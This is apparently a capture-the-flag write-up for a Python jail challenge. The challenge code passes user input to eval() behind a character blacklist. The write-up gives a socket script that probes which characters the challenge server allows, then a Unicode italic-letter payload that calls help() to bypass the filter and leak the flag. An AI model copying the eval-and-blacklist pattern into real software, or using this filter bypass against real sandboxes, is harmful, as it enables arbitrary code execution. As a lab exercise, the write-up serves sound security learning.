# Capital Of Italy

Nothing... Just a simple pyjail.

- Category: misc
- Challenge file: main.py

### Solution:

##### 1. View the source code for main.py

```py
#!/usr/bin/env python3
REDACTED = "ironCTF{test}"
blacklist = 'REDACTEDREDACTED'
print("WELCOME :)")
breakpoint = "breakpoint"
data = input()

if len(data) > 12:
    print("Too long...")
    exit()

for chars in blacklist:
    if chars in data:
        print("Blocked Character: ", chars)
        exit()
try:
    eval(data)
except Exception as e:
    print("Something went wrong\n", e)
```

The source code checks the length of input which should be less than 12 characters and having a blacklist to check unallowed characters from blacklist. However, we have no clue what are the allowed characters since is `REDACTED`.

##### 2. Script to test allowed characters 

```py
import socket
import string
import time

class CharacterTester:
    def __init__(self, host="misc.1nf1n1ty.team", port=30010):
        self.host = host
        self.port = port

    def test_character(self, char):
        """Test a single character against the server"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.connect((self.host, self.port))
                sock.recv(1024)

                payload = f"({char})"
                sock.send(payload.encode() + b'\n')
                response = sock.recv(1024).decode()
                return "Blocked Character" not in response

        except Exception as e:
            print(f"Error testing character '{char}': {e}")
            return False

    def test_all_characters(self):
        """Test all printable ASCII characters"""
        allowed_chars = []
        blocked_chars = []

        chars_to_test = string.printable

        print("Starting character testing...")
        print("This may take a few minutes...")

        for char in chars_to_test:
            if char in string.whitespace:
                continue

            print(f"Testing character: {char}", end='\r')

            if self.test_character(char):
                allowed_chars.append(char)
                print(f"\nAllowed character found: {char}")
            else:
                blocked_chars.append(char)
            time.sleep(0.5)

        return allowed_chars, blocked_chars

def main():
    tester = CharacterTester()

    print("Character Testing Tool for PyJail Challenge")
    print("==========================================")
    print(f"Target: {tester.host}:{tester.port}")
    print("Starting tests...\n")

    allowed_chars, blocked_chars = tester.test_all_characters()

    print("\n\nResults:")
    print("========")
    print("\nAllowed characters:")
    print(''.join(sorted(allowed_chars)))
    print(f"Total allowed: {len(allowed_chars)}")

    print("\nBlocked characters:")
    print(''.join(sorted(blocked_chars)))
    print(f"Total blocked: {len(blocked_chars)}")
    with open("char_test_results.txt", "w") as f:
        f.write("PyJail Character Test Results\n")
        f.write("============================\n\n")
        f.write("Allowed characters:\n")
        f.write(''.join(sorted(allowed_chars)))
        f.write(f"\nTotal allowed: {len(allowed_chars)}\n\n")
        f.write("Blocked characters:\n")
        f.write(''.join(sorted(blocked_chars)))
        f.write(f"\nTotal blocked: {len(blocked_chars)}\n")

    print("\nResults have been saved to 'char_test_results.txt'")

if __name__ == "__main__":
    main()
```

And we can test and look at the outcome

```bash
$ python3 test-char.py
Character Testing Tool for PyJail Challenge
==========================================
Target: misc.1nf1n1ty.team:30010
Starting tests...

Starting character testing...
This may take a few minutes...
Testing character: (
Allowed character found: (
Testing character: )
Allowed character found: )
Testing character: ~

Results:
========

Allowed characters:
()
Total allowed: 2

Blocked characters:
!"#$%&'*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
Total blocked: 92

Results have been saved to 'char_test_results.txt'
```

Characters of `(` and `)` is allowed, now we able to craft our payload based on this conditions.

##### 3. Craft payload

Since it check for normal characters and hint of title suggest "Italic" text. Perhaps we can try `ùò©ùò¶ùò≠ùò±()`

```bash
$ nc misc.1nf1n1ty.team 30010
WELCOME :)
ùò©ùò¶ùò≠ùò±()

It works !

##### 4. Try calling out main module

```bash
nc misc.1nf1n1ty.team 30010
WELCOME :)
ùò©ùò¶ùò≠ùò±()

Summary of outcome:
- `blacklist`: The value appears to be a string containing whitespace characters, digits, and both lowercase and uppercase letters. A blacklist like this might be used to filter out specific characters from user input or to limit allowed characters in a decoding or brute-force process.

- `breakpoint`: This is set to the string 'breakpoint'. It could be used as a debugging indicator or to trigger a specific condition in the script's logic.

- `chars` = ']': This variable holds a single character, ]. It might be used as a delimiter, part of string parsing logic, or to identify a specific end in the text.

- `data` = 'ùò©ùò¶ùò≠ùò±()': This appears to be a Unicode string using mathematical italic characters. It's likely used to obfuscate text or function names, making it harder to understand the code's behavior at first glance.

- `ffiivVIxistivIX = ironCTF{R0M4N_T1mes}`: This is the flag string

**Flag:** `ironCTF{R0M4N_T1mes}`
